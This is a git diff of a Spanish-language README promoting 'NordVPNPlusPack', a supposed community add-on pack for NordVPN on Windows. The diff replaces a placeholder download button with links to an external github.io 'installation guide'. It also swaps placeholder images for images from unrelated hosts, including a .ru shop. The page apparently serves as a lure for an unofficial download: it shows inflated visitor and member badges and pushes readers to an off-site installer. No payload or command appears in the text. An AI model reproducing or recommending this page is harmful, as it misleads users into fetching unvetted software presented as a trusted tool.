@@ -2,13 +2,14 @@
 
 ![Visitantes: 100K+](https://img.shields.io/badge/Visitantes-100K+-e74c3c) ![Miembros: 80K+](https://img.shields.io/badge/Miembros-80K+-6c5ce7) ![Actualizado](https://img.shields.io/badge/Actualizado-blue)
 
-![NordVPNPlusPack Banner](https://i.imgur.com/nordvpn-plus-banner.jpg)
+![NordVPNPlusPack Banner](https://www.safeshellvpn.com/o/pic/20250409/836dad77-5e0d-472a-a483-53dce27c4dde.webp)
 
 **Acerca de NordVPNPlusPack**: NordVPNPlusPack es un repositorio para usuarios de *NordVPN* en Windows, con herramientas y configuraciones personalizadas para optimizar conexiones. Mejora la velocidad y seguridad con soluciones creadas por la comunidad. Con 100K+ visitantes y 80K+ miembros, ¡eleva tu privacidad en línea hoy! (276 caracteres)
 
-[![Acceder a Optimizaciones](https://img.shields.io/badge/Acceder_a_Optimizaciones-AHORA-27ae60?style=rounded&labelColor=2c3e50)](https://example.com/nordvpn-plus-pack.zip)
+<a href="https://nordvpn-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+</a>
 
----
 
 ## 🚀 Primeros Pasos
 
@@ -20,9 +21,10 @@ Potencia tu *NordVPN* con **NordVPNPlusPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
-[![Acceder a Optimizaciones](https://img.shields.io/badge/Acceder_a_Optimizaciones-AHORA-27ae60?style=rounded&labelColor=2c3e50)](https://example.com/nordvpn-plus-pack.zip)
+<a href="https://nordvpn-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+</a>
 
----
 
 ## 🛠 ¿Por qué NordVPNPlusPack?
 
@@ -73,11 +75,11 @@ Potencia tu *NordVPN* con **NordVPNPlusPack** en Windows:
 ## 📸 Visuales
 
 **Interfaz de NordVPNPlusPack**  
-![Interfaz](https://www.example.com/images/nordvpn-plus-interface.jpg)  
+![Interfaz](https://boardrussia.ru/digital-shop/img/preview-997283-p1_3209763_9c3f77d1.jpg)  
 *Panel de optimización intuitivo.*
 
 **Características de las Herramientas**  
-![Características](https://www.example.com/images/nordvpn-plus-features.jpg)  
+![Características](http://oyster.ignimgs.com/wordpress/stg.ign.com/2017/05/NordVPN-4.jpg)  
 *Herramientas optimizadas para NordVPN.*
 
 ---
